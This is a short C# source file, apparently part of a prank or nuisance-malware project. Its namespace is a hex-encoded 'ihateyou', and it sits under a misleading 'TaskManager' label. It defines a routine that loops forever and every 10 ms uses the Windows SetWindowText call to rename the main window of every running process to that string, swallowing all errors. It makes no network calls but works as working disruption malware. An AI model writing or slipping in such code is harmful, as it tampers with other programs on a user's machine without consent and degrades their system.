using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace _6968617465796f750d0a.Services.TaskManager
{
    class Rename
    {

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool SetWindowText(IntPtr hwnd, String lpString);

        public async void RenameAll()
        {

            while (true)
            {

                Process[] processes = Process.GetProcesses();

                foreach(Process process in processes)
                {
                    IntPtr HandleProcess = process.MainWindowHandle;
                    if (HandleProcess != IntPtr.Zero)
                    {
                        try { SetWindowText(HandleProcess, "6968617465796f750d0a"); } catch { }
                    }
                }

                await Task.Delay(10);

            }

        }

    }
}
